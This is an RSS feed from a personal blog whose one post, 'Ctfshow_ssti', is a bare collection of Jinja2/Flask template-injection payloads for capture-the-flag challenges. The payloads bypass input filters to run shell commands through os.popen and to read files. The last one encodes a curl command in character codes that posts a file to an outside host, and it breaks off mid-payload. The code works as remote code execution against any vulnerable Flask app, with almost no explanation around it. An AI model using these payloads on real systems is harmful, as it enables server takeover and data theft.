<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Only-one on Only_ONE</title>
    <link>https://www.lier.xin/post/</link>
    <description>Recent content from Only_ONE</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    
    <managingEditor>3310338687@qq.com (Lier)</managingEditor>
    <webMaster>3310338687@qq.com (Lier)</webMaster>
    
    <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
    
    <lastBuildDate>Tue, 22 Jul 2025 18:36:38 +0800</lastBuildDate>
    
    
    <atom:link href="https://www.lier.xin/post/index.xml" rel="self" type="application/rss&#43;xml" />
    

    
    

    <item>
      <title>Ctfshow_ssti</title>
      <link>https://www.lier.xin/post/ctfshow_ssti/</link>
      <pubDate>Tue, 22 Jul 2025 18:36:38 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/ctfshow_ssti/</guid>
      <description>
        <![CDATA[<h1>Ctfshow_ssti</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="payload收集">
<a class="header-anchor" href="#payload%e6%94%b6%e9%9b%86"></a>
payload收集
</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## 过滤数字</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 中括号</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">get_glashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 下划线</span>
</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">a</span><span class="p">))</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 中括号</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">x1</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">x2</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号</span>
</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">gl</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">ls</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 os</span>
</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">gl</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">ls</span>
</span></span><span class="line"><span class="cl"><span class="c1">##&#39;.&#39;,&#39;_&#39;,&#39;|join&#39;,&#39;[&#39;,&#39;]&#39;,&#39;mro&#39;,&#39;base&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request</span>
</span></span><span class="line"><span class="cl"><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>       <span class="o">//</span><span class="n">_</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> <span class="o">//</span><span class="vm">__globals__</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span><span class="o">//</span><span class="n">__builtins__</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>            
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span> <span class="n">a</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request 数字</span>
</span></span><span class="line"><span class="cl"><span class="c1">###直接构造</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">one</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">length</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">two</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">aa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">length</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">one</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">two</span> <span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">ee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">coun</span><span class="o">=</span><span class="p">(</span><span class="n">cc</span><span class="o">~</span><span class="n">cccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">po</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">coun</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ini</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">init</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">geti</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">built</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">ini</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">geti</span><span class="p">))(</span><span class="n">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">x</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">file</span><span class="o">=</span><span class="nb">chr</span><span class="p">((</span><span class="n">cccc</span><span class="o">~</span><span class="n">ccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">cc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">cccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">ccccccccc</span><span class="o">~</span><span class="n">ccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">ccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">###全角数字代替半角数字</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">２４</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">a</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０３</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request 数字 {%print %}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">２４</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">so</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">e</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">q</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">f</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">so</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">cmd</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">９９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">７９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">７０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">６１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">６４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span 